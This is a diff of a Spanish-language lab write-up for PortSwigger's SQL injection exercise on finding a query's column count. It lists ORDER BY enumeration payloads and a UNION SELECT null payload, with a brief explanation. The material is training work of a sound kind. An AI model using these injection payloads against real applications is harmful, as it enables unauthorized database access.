@@ -1,11 +1,59 @@
-[Lab: Determine Number of Columns](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
+# SQL Injection UNION Attack - Determine Number of Columns
 
-Lo siguiente es validar que podamos determinar el número de columnas disponibles en la ejecución, para esto se utiliza el parámetro `ORDER BY` e ir iterando hasta alcanzar el mensaje de error nuevamente.
+## 📌 Lab Information
 
-Sentencia:
-' ORDER BY <número> --
+- **Lab:** Determine Number of Columns
+- **Categoría:** UNION SQL Injection
 
-Para resolver el laboratorio, tendremos que ingresar la sentencia:
+🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
 
-`` union select null,null,null -- -`
-![[Pasted image 20260331174428.png]]
+---
+
+## 🎯 Objetivo
+
+Determinar la cantidad de columnas utilizadas por la consulta SQL vulnerable.
+
+---
+
+## 🔍 Enumeración con ORDER BY
+
+Utilizamos:
+
+```sql
+' ORDER BY 1 -- -
+' ORDER BY 2 -- -
+' ORDER BY 3 -- -
+```
+
+Hasta obtener un error.
+
+---
+
+## 🚀 Confirmación de columnas
+
+Payload final:
+
+```sql
+' union select null,null,null -- -
+```
+
+![Tres columnas](Imagenes/pasted-image-20260331174428.png)
+
+---
+
+## 🧠 Explicación Técnica
+
+`ORDER BY` permite identificar cuántas columnas existen:
+
+- Si la columna existe → respuesta correcta.
+- Si excede el número real → error SQL.
+
+---
+
+## ✅ Resultado
+
+La consulta vulnerable contiene exactamente:
+
+```text
+3 columnas
+```
